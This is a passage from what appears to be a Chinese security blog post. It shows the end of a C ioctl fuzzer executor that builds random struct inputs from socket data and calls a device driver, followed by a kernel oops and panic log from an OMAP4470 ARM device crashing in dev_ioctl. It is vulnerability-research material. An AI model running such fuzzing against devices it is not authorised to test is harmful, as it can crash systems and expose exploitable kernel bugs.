class="line">		<span class="comment">// first create an array to store the sizes themselves</span></span><br><span class="line">		len_arr = <span class="built_in">calloc</span>(num_blobs, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">		<span class="keyword">if</span> (len_arr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate len_arr\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// we&#x27;ll also want an array to store our pointers</span></span><br><span class="line">		ptr_arr = <span class="built_in">calloc</span>(num_blobs, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">		<span class="keyword">if</span> (ptr_arr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate ptr_arr\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// copy the blob sizes into our size_arr</span></span><br><span class="line">		<span class="keyword">for</span> (j=<span class="number">0</span>; j &lt; num_blobs; j++) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;len_arr[j], head, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">			head += <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// we&#x27;ll also want memory bufs for all blobs</span></span><br><span class="line">		<span class="comment">// now that we have the sizes, allocate all the buffers we need</span></span><br><span class="line">		<span class="keyword">for</span> (j=<span class="number">0</span>; j &lt; num_blobs; j++) &#123;</span><br><span class="line">			ptr_arr[j] = <span class="built_in">calloc</span>(len_arr[j], <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Sizeof(ptr_arr[%d])=%d\n&quot;</span>, j, len_arr[j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ptr_arr[%d]=%p\n&quot;</span>, j, ptr_arr[j]);</span><br><span class="line"></span><br><span class="line">			<span class="comment">//printf(&quot;just added %p to ptr_arr\n&quot;, ptr_arr[j]);</span></span><br><span class="line">			<span class="keyword">if</span> (ptr_arr[j] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate a blob store\n&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// might as well copy the memory over as soon as we allocate the space</span></span><br><span class="line">			<span class="built_in">memcpy</span>((<span class="keyword">char</span> *)ptr_arr[j], head, len_arr[j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ptr_arr[%d]=\n&quot;</span>, j);</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len_arr[j];i+=<span class="number">4</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;0x%08x\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ptr_arr[j] + i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">			head += len_arr[j];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> num_generics = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// time for pointer fixup</span></span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_mappings; i++) &#123;</span><br><span class="line">			<span class="comment">// get out entry</span></span><br><span class="line">			<span class="keyword">map_entry_t</span> entry = <span class="built_in">map</span>[i];</span><br><span class="line">			<span class="comment">// pull out the struct to be fixed up</span></span><br><span class="line">			<span class="keyword">char</span> *tmp = ptr_arr[entry.src_id];</span><br><span class="line">		</span><br><span class="line">			<span class="comment">// check if this is a struct ptr or just a generic one</span></span><br><span class="line">			</span><br><span class="line">			<span class="comment">// just a generic one</span></span><br><span class="line">			<span class="keyword">if</span> (entry.dst_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="comment">// 90% chance we fixup the generic</span></span><br><span class="line">				<span class="keyword">if</span> ( (rand() % <span class="number">10</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> buf_len = <span class="number">128</span>;</span><br><span class="line">					<span class="keyword">char</span> *tmp_generic = <span class="built_in">malloc</span>(buf_len);</span><br><span class="line">					<span class="built_in">memset</span>(tmp_generic, <span class="number">0</span>, buf_len);</span><br><span class="line">					<span class="comment">// 95% chance we fill it with data</span></span><br><span class="line">					<span class="keyword">if</span> ((rand() % <span class="number">100</span>) &gt; <span class="number">95</span>) &#123;</span><br><span class="line">						<span class="comment">// if dst_id is &lt; 0, it&#x27;s abs value is the element size</span></span><br><span class="line">						<span class="keyword">int</span> size = <span class="number">-1</span> * entry.dst_id;</span><br><span class="line">						<span class="keyword">int</span> weight;</span><br><span class="line">						<span class="comment">// if it&#x27;s a char or some float, never choose a &quot;small val&quot;</span></span><br><span class="line">						<span class="keyword">if</span> (size == <span class="number">1</span> || size &gt; <span class="number">8</span>)</span><br><span class="line">							weight = <span class="number">0</span>;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							weight = default_weight;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; buf_len; i+=size) &#123;</span><br><span class="line">							gen_rand_val(size, &amp;tmp_generic[i], weight);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					generic_arr[num_generics] = tmp_generic;</span><br><span class="line">					<span class="built_in">memcpy</span>(tmp+entry.offset, &amp;tmp_generic, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">					num_generics += <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">if</span> (num_generics &gt;= <span class="number">264</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;Code a better solution for storing generics\n&quot;</span>);</span><br><span class="line">						<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// a struct ptr, so we have the data</span></span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// 1 in 400 chance we don&#x27;t fixup</span></span><br><span class="line">				<span class="keyword">if</span> ( (rand() % <span class="number">400</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="comment">// now point it to the correct struct/blob</span></span><br><span class="line">					<span class="comment">// printf(&quot;placing %p, at %p\n&quot;, ptr_arr[entry.dst_id], tmp+entry.offset);</span></span><br><span class="line">					<span class="built_in">memcpy</span>(tmp+entry.offset, &amp;ptr_arr[entry.dst_id], <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (debug) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ioctl_id: %d\n&quot;</span>, ioctl_id);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;num_mappings: %d\n&quot;</span>, num_mappings);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;num_blobs: %d\n&quot;</span>, num_blobs);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;dev_name_len: %d\n&quot;</span>, dev_name_len);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;dev_name: %s\n&quot;</span>, dev_name);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;data[]: \n&quot;</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;(0x%x)\n&quot;, *(int *)&amp;ptr_arr[0]);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, &amp;ptr_arr[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)ptr_arr[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">1</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">1</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">2</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">2</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">3</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">3</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">4</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">4</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+5*8));</span></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+6*8));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%x)\n&quot;, (int *)ptr_arr, (int *)ptr_arr);</span></span><br><span class="line">            </span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// time for the actual ioctl</span></span><br><span class="line">		<span class="comment">//printf(&quot;Try to open device %s\n&quot;, dev_name);</span></span><br><span class="line">		<span class="comment">//fflush(stdout);</span></span><br><span class="line">		<span class="keyword">int</span> fd = open(dev_name, O_RDONLY);</span><br><span class="line">		<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">&quot;Open devicd %s successfully.\n&quot;</span>, dev_name);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//fflush(stdout);</span></span><br><span class="line">		<span class="comment">//printf(&quot;Try to call ioctl(fd=%d, ioctl_id=%d, ptr_arr=%p)\n&quot;, fd, ioctl_id, ptr_arr[0]);</span></span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%10d:&quot;</span>, cnt++);</span><br><span class="line">		<span class="keyword">if</span> ((ioctl(fd, ioctl_id, ptr_arr[<span class="number">0</span>])) == <span class="number">-1</span>)</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;good hit\n&quot;</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;device %s closed\n&quot;</span>, dev_name);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (retest)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="comment">// okay now free all the shit we alloced</span></span><br><span class="line">		<span class="built_in">free</span>(recv_buf);</span><br><span class="line">		<span class="built_in">free</span>(dev_name);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">map</span> != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">		<span class="built_in">free</span>(len_arr);</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_blobs; i++) &#123;</span><br><span class="line">			<span class="comment">//printf(&quot;%d: free&#x27;ing %p\n&quot;, i, ptr_arr[i]);</span></span><br><span class="line">			<span class="built_in">free</span>(ptr_arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span>(ptr_arr);</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_generics; i++) &#123;</span><br><span class="line">			<span class="built_in">free</span>(generic_arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		write(client_sock, &amp;msg_size, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		msg_size = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">if</span>(read_size == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Client disconnected&quot;</span>);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		close(client_sock);</span><br><span class="line">		<span class="keyword">goto</span> listen;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(read_size == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  144.428375] Unable to handle kernel paging request at virtual address d900000c</span><br><span class="line">[  144.436462] pgd &#x3D; dcac0000</span><br><span class="line">[  144.439697] [d900000c] *pgd&#x3D;00000000</span><br><span class="line">[  144.443939] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[  144.450012] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  144.457672] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  144.465118] PC is at c2dm_l1cache+0x30&#x2F;0x100</span><br><span class="line">[  144.469940] LR is at dev_ioctl+0x3f0&#x2F;0x10c4</span><br><span class="line">[  144.474670] pc : [&lt;c03187ac&gt;]    lr : [&lt;c031782c&gt;]    psr: a0000013</span><br><span class="line">[  144.474670] sp : c2d6be38  ip : 00000000  fp : c2d6be6c</span><br><span class="line">[  144.487640] r10: 00000000  r9 : d8c0cca8  r8 : 00b8dd90</span><br><span class="line">[  144.493621] r7 : 00000000  r6 : c2d6bea4  r5 : 00b8dd90  r4 : 388b77c4</span><br><span class="line">[  144.500915] r3 : d9000004  r2 : 75e0c121  r1 : c2d6bea4  r0 : 00000000</span><br><span class="line">[  144.508331] Flags: NzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  144.516418] Control: 10c5387d  Table: 9cac004a  DAC: 00000015</span><br><span class="line">[  144.522827] </span><br><span class="line">[  144.522857] PC: 0xc031872c:</span><br><span class="line">[  144.527954] 872c  e51b2034 e592300c eaffffa5 e30c281c e34c209d e5923000 e3530000 1affffbd</span><br><span class="line">[  144.538482] 874c  eaffffc0 e51b303c e51b1040 e2833001 e51b2034 e1530001 e50b303c e2822010</span><br><span class="line">[  144.549163] 876c  e50b2034 1affff8c eaffff83 c09dc81c e1a0c00d e92ddff0 e24cb004 e24dd00c</span><br><span class="line">[  144.559844] 878c  e3500000 e1a07002 e50b0030 da00000d e0814200 e1a06001 e1a03001 e3a02000</span><br><span class="line">[  144.570404] 87ac  e5930008 e593c004 e2833010 e1530004 e022209c 1afffff9 e3520902 3a000003</span><br><span class="line">[  144.581085] 87cc  e3570002 9a000022 e24bd028 e89daff0 e59f9090 e2818008 e3a0a000 e5963008</span><br><span class="line">[  144.591735] 87ec  e5184008 e3530000 13a05000 1a00000a ea000010 e5181004 e5993024 e0841001</span><br><span class="line">[  144.602416] 880c  e12fff33 e5962008 e2855001 e596300c e1550002 e0844003 2a000006 e2572000</span><br><span class="line">[  144.612976] </span><br><span class="line">[  144.612976] LR: 0xc03177ac:</span><br><span class="line">[  144.618072] 77ac  ebf55c15 eaffff35 e3053d8d e3443038 e1510003 1affff30 e1a0200d e3c23d7f</span><br><span class="line">[  144.628631] 77cc  e3c3303f e24b0064 e5933008 e2952038 30d22003 33a03000 e3530000 1a0001a8</span><br><span class="line">[  144.639160] 77ec  e1a01005 e3a02038 ebfcfa90 e3500000 1a00000e e51b2030 e3520001 0a0001cb</span><br><span class="line">[  144.649780] 780c  e3520002 0a0001ee e3520000 1a000007 e51b0064 e3a02000 e24b1060 eb0003d3</span><br><span class="line">[  144.660369] 782c  e51b0064 e24b1060 e51b2030 eb000338 e3a05000 eaffff11 e24b1064 e50b1088</span><br><span class="line">[  144.670776] 784c  e51b0088 e3a01010 ebfd03c1 e3a03004 e50b3064 e5963008 e2952004 30d22003</span><br><span class="line">[  144.681213] 786c  33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f e3c6603f</span><br><span class="line">[  144.691528] 788c  e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 e1a01005</span><br><span class="line">[  144.701995] </span><br><span class="line">[  144.701995] SP: 0xc2d6bdb8:</span><br><span class="line">[  144.706878] bdb8  c2d6be24 00b8dd90 c2d6bdec c2d6bdd0 c00084d0 c03187ac a0000013 ffffffff</span><br><span class="line">[  144.717407] bdd8  c2d6be24 00b8dd90 c2d6be6c c2d6bdf0 c06a5318 c0008370 00000000 c2d6bea4</span><br><span class="line">[  144.727905] bdf8  75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 00000000 00b8dd90 d8c0cca8</span><br><span class="line">[  144.738586] be18  00000000 c2d6be6c 00000000 c2d6be38 c031782c c03187ac a0000013 ffffffff</span><br><span class="line">[  144.749145] be38  c02ba53c 575b4b92 d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90</span><br><span class="line">[  144.759796] be58  d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088</span><br><span class="line">[  144.770355] be78  000ffeff 00000001 c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000</span><br><span class="line">[  144.781005] be98  c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261</span><br><span class="line">[  144.791687] </span><br><span class="line">[  144.791687] FP: 0xc2d6bdec:</span><br><span class="line">[  144.796661] bdec  c0008370 00000000 c2d6bea4 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4</span><br><span class="line">[  144.807189] be0c  00000000 00b8dd90 d8c0cca8 00000000 c2d6be6c 00000000 c2d6be38 c031782c</span><br><span class="line">[  144.817840] be2c  c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 00000000 00b8dd90</span><br><span class="line">[  144.828399] be4c  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c</span><br><span class="line">[  144.839080] be6c  c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc c2d6be90 c0207454</span><br><span class="line">[  144.849761] be8c  c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f</span><br><span class="line">[  144.860290] beac  83b275c7 00000000 00020261 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  144.870971] becc  00000000 00000000 00000000 c02089fc 00000000 dcae46c0 0000000b dcae46c0</span><br><span class="line">[  144.881652] </span><br><span class="line">[  144.881652] R1: 0xc2d6be24:</span><br><span class="line">[  144.886627] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000</span><br><span class="line">[  144.897308] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04</span><br><span class="line">[  144.907989] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc</span><br><span class="line">[  144.918518] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92</span><br><span class="line">[  144.929199] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000</span><br><span class="line">[  144.939849] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0</span><br><span class="line">[  144.950531] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044</span><br><span class="line">[  144.961059] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  144.971710] </span><br><span class="line">[  144.971710] R3: 0xd8ffff84:</span><br><span class="line">[  144.976623] ff84  d8ffff20 d8efb000 00000707 020e40fb d8efb075 d8ffff3c d8efb01c d8ffffa0</span><br><span class="line">[  144.987213] ffa4  d8ffffa0 d8efb028 ca9788f0 d8ffffb0 d8ffffb0 00000000 bf06e9c8 80000088</span><br><span class="line">[  144.997772] ffc4  dd2eac00 dd309540 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  145.008392] ffe4  00000000 00000000 00000000 00000000 00000000 00000000 00000000 ********</span><br><span class="line">[  145.018798] 0004  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.029327] 0024  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.039886] 0044  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.050384] 0064  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.060913] </span><br><span class="line">[  145.060913] R6: 0xc2d6be24:</span><br><span class="line">[  145.066009] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000</span><br><span class="line">[  145.076568] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04</span><br><span class="line">[  145.087219] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc</span><br><span class="line">[  145.097900] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92</span><br><span class="line">[  145.108459] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000</span><br><span class="line">[  145.118988] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0</span><br><span class="line">[  145.129638] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044</span><br><span class="line">[  145.140319] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  145.150848] </span><br><span class="line">[  145.150848] R9: 0xd8c0cc28:</span><br><span class="line">[  145.155944] cc28  d8c0cc28 d8c0cc28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  145.166503] cc48  00000000 00000000 d8c0cc50 d8c0cc50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  145.177062] cc68  5aefd94b 00000000 00000000 00000000 d8c0cc80 9ad1f453 00000000 00000000</span><br><span class="line">[  145.187713] cc88  00200000 00000000 00000000 d8c0cc94 d8c0cc94 dd3b56c0 dd3b56c0 00000000</span><br><span class="line">[  145.198394] cca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><br><span class="line">[  145.208923] ccc8  d8c0cd80 dd3e3e70 00001064 00000001 0fb00000 5aefd94b 2d2b4d13 5aefd94b</span><br><span class="line">[  145.219573] cce8  2d2b4d13 5aefd94b 2d2b4d13 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  145.230255] cd08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0cd24</span><br><span class="line">[  145.240936] Process executor32 (pid: 3810, stack limit &#x3D; 0xc2d6a2f8)</span><br><span class="line">[  145.248016] Stack: (0xc2d6be38 to 0xc2d6c000)</span><br><span class="line">[  145.253082] be20:                                                       c02ba53c 575b4b92</span><br><span class="line">[  145.262176] be40: d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000</span><br><span class="line">[  145.271392] be60: c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001</span><br><span class="line">[  145.280609] be80: c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8</span><br><span class="line">[  145.289703] bea0: 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000</span><br><span class="line">[  145.298919] bec0: 00000000 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000</span><br><span class="line">[  145.308105] bee0: dcae46c0 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08</span><br><span class="line">[  145.317352] bf00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  145.326416] bf20: dcf8c440 c2d6bf0c c2d6a000 00b8dd80 00b8dd90 40385d8d dcae46c0 0000000b</span><br><span class="line">[  145.335662] bf40: c2d6a000 00000000 c2d6bf64 00000000 00b8dd90 40385d8d dcae46c0 0000000b</span><br><span class="line">[  145.344879] bf60: c2d6a000 00000000 c2d6bfa4 c2d6bf78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  145.354095] bf80: c0013e08 00b8dd80 000121c0 00000000 00000036 c0013e08 00000000 c2d6bfa8</span><br><span class="line">[  145.363159] bfa0: c0013c60 c0136578 00b8dd80 000121c0 0000000b 40385d8d 00b8dd90 00b8dd90</span><br><span class="line">[  145.372406] bfc0: 00b8dd80 000121c0 00000000 00000036 00000000 00000000 00000000 bee035f4</span><br><span class="line">[  145.381622] bfe0: 810100fc bee030f4 00011578 0002b28c 60000010 0000000b 4d6969d9 03020430</span><br><span class="line">[  145.390686] Backtrace: </span><br><span class="line">[  145.393829] [&lt;c031877c&gt;] (c2dm_l1cache+0x0&#x2F;0x100) from [&lt;c031782c&gt;] (dev_ioctl+0x3f0&#x2F;0x10c4)</span><br><span class="line">[  145.403228] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  145.412658] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  145.421874] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  145.431304]  r8:c0013e08 r7:00000036 r6:00000000 r5:000121c0 r4:00b8dd80</span><br><span class="line">[  145.439605] Code: e0814200 e1a06001 e1a03001 e3a02000 (e5930008) </span><br><span class="line">[  145.450225] Board Information: </span><br><span class="line">[  145.450225]  Revision : 0001</span><br><span class="line">[  145.450256]  Serial	: 0000000000000000</span><br><span class="line">[  145.450256] SoC Information:</span><br><span class="line">[  145.450256]  CPU	: OMAP4470</span><br><span class="line">[  145.450286]  Rev	: ES1.0</span><br><span class="line">[  145.450286]  Type	: HS</span><br><span class="line">[  145.450286]  Production ID: 0002B975-000000CC</span><br><span class="line">[  145.450286]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  145.450317] </span><br><span class="line">[  145.485900] ---[ end trace 0fe3b4c74b4e9fa7 ]---</span><br><span class="line">[  145.491149] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  145.496917] CPU1: stopping</span><br><span class="line">[  145.500152] Backtrace: </span><br><span class="line">[  145.503204] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  145.512695]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[  145.519714] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  145.528961] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from 